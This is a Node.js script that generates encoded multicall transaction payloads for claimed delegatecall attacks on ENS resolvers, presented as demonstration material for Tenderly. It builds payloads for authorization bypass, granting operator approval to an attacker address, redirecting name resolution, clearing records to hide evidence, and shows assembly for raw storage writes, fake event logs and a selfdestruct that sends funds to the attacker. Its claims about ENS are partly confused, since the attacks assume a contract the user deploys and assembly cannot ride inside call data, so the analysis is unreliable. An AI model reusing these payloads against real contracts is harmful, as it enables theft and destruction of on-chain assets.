#!/usr/bin/env node

/**
 * TENDERLY BYTECODE GENERATOR
 *
 * This script generates raw bytecode for ENS delegatecall vulnerability attacks
 * that can be used directly in Tenderly for demonstration and analysis.
 */

const ethers = require('ethers');

// Contract interface for encoding
const multicallInterface = new ethers.utils.Interface([
    "function multicall(bytes[] data) returns (bytes[])"
]);

const resolverInterface = new ethers.utils.Interface([
    "function setAddr(bytes32 node, uint256 coinType, bytes addrData)",
    "function setApprovalForAll(address operator, bool approved)",
    "function setAuthorized(address user, bool status)",
    "function clearRecords(bytes32 node)"
]);

function generateAttack1_DirectAuthorizationBypass() {
    console.log("=== ATTACK 1: DIRECT AUTHORIZATION BYPASS ===");
    console.log("Description: Use multicall to bypass authorization checks");
    console.log("");

    // Create the inner call: setAuthorized(attacker, true)
    const setAuthorizedCall = resolverInterface.encodeFunctionData(
        "setAuthorized",
        ["0x0000000000000000000000000000000000001337", true]
    );

    // Create multicall data
    const multicallData = multicallInterface.encodeFunctionData(
        "multicall",
        [[setAuthorizedCall]]
    );

    console.log("Raw Transaction Data:");
    console.log(multicallData);
    console.log("");

    console.log("Decoded:");
    console.log("- Function: multicall(bytes[])");
    console.log("- Inner Call: setAuthorized(0x1337, true)");
    console.log("- Effect: Attacker becomes authorized despite no direct access");
    console.log("");
}

function generateAttack2_StorageChaining() {
    console.log("=== ATTACK 2: STORAGE MANIPULATION CHAINING ===");
    console.log("Description: Chain multiple calls to manipulate storage state");
    console.log("");

    const calls = [];

    // Call 1: setApprovalForAll(attacker, true)
    calls.push(resolverInterface.encodeFunctionData(
        "setApprovalForAll",
        ["0x0000000000000000000000000000000000001337", true]
    ));

    // Call 2: setAddr(testNode, attacker)
    const testNode = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
            ["bytes32", "bytes32"],
            [
                "0x0000000000000000000000000000000000000000000000000000000000000000",
                ethers.utils.keccak256(ethers.utils.toUtf8Bytes("test"))
            ]
        )
    );

    calls.push(resolverInterface.encodeFunctionData(
        "setAddr",
        [testNode, 60, "0x0000000000000000000000000000000000001337"]
    ));

    // Call 3: clearRecords(testNode)
    calls.push(resolverInterface.encodeFunctionData(
        "clearRecords",
        [testNode]
    ));

    const multicallData = multicallInterface.encodeFunctionData("multicall", [calls]);

    console.log("Raw Transaction Data:");
    console.log(multicallData);
    console.log("");

    console.log("Decoded Calls:");
    console.log("1. setApprovalForAll(0x1337, true) - Grant operator status");
    console.log("2. setAddr(testNode, 60, 0x1337) - Change resolution");
    console.log("3. clearRecords(testNode) - Hide attack evidence");
    console.log("");
}

function generateAttack3_TrustedControllerEscalation() {
    console.log("=== ATTACK 3: TRUSTED CONTROLLER PRIVILEGE ESCALATION ===");
    console.log("Description: Inherit trusted controller privileges via delegatecall");
    console.log("");

    // This attack requires the controller context
    // The delegatecall inherits msg.sender = trustedController
    const setAddrCall = resolverInterface.encodeFunctionData(
        "setAddr",
        [
            "0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae", // test.eth node
            60,
            "0x0000000000000000000000000000000000001337"
        ]
    );

    const multicallData = multicallInterface.encodeFunctionData(
        "multicall",
        [[setAddrCall]]
    );

    console.log("Raw Transaction Data (call via trusted controller):");
    console.log(multicallData);
    console.log("");

    console.log("Context Requirements:");
    console.log("- msg.sender must be trusted controller (EthRegistrarController)");
    console.log("- delegatecall inherits trusted privileges");
    console.log("- isAuthorised() returns true immediately");
    console.log("");
}

function generateAttack15_StorageSlotDirectManipulation() {
    console.log("=== ATTACK 15: STORAGE SLOT DIRECT MANIPULATION ===");
    console.log("Description: Direct EVM storage manipulation via assembly");
    console.log("");

    console.log("This attack requires inline assembly in multicall data.");
    console.log("Example assembly code:");
    console.log("");

    console.log("assembly {");
    console.log("    // Direct storage write");
    console.log("    sstore(0x123, 0x456)  // Write to storage slot");
    console.log("    ");
    console.log("    // Manipulate operator approvals mapping");
    console.log("    // sstore(approvalsSlot, attackerData)");
    console.log("    ");
    console.log("    // Event emission (fake audit trail)");
    console.log("    log3(0, 0, topic1, topic2, topic3)");
    console.log("}");

    console.log("");
    console.log("Raw bytecode would be generated from this assembly.");
    console.log("This bypasses ALL Solidity access controls.");
    console.log("");
}

function generateAttack18_Selfdestruct() {
    console.log("=== ATTACK 18: SELFDESTRUCT IN DELEGATE CONTEXT ===");
    console.log("Description: Contract self-destruction via delegatecall");
    console.log("");

    console.log("Selfdestruct bytecode (assembly):");
    console.log("");

    console.log("assembly {");
    console.log("    let beneficiary := 0x1337  // attacker address");
    console.log("    selfdestruct(beneficiary)");
    console.log("}");

    console.log("");
    console.log("Effects:");
    console.log("- Contract bytecode set to 0x");
    console.log("- All ETH transferred to attacker");
    console.log("- Contract permanently destroyed");
    console.log("- ENS resolutions break globally");
    console.log("");
}

function generateAllAttacks() {
    console.log("ENS DELEGATECALL VULNERABILITY - TENDERLY BYTECODE GENERATOR");
    console.log("=================================================================");
    console.log("");

    generateAttack1_DirectAuthorizationBypass();
    console.log("=================================================================");

    generateAttack2_StorageChaining();
    console.log("=================================================================");

    generateAttack3_TrustedControllerEscalation();
    console.log("=================================================================");

    generateAttack15_StorageSlotDirectManipulation();
    console.log("=================================================================");

    generateAttack18_Selfdestruct();
    console.log("=================================================================");

    console.log("USAGE INSTRUCTIONS:");
    console.log("1. Deploy a contract with multicall(bytes[] data) that uses delegatecall");
    console.log("2. Copy the 'Raw Transaction Data' above");
    console.log("3. Use it as transaction data in Tenderly");
    console.log("4. Observe the authorization bypass and state manipulation");
    console.log("");
    console.log("All attacks demonstrate the fundamental flaw:");
    console.log("delegatecall(address(this), data) preserves attacker context");
    console.log("while granting access to contract storage and functions.");
}

// Run if called directly
if (require.main === module) {
    generateAllAttacks();
}

module.exports = {
    generateAttack1_DirectAuthorizationBypass,
    generateAttack2_StorageChaining,
    generateAttack3_TrustedControllerEscalation,
    generateAttack15_StorageSlotDirectManipulation,
    generateAttack18_Selfdestruct,
    generateAllAttacks
};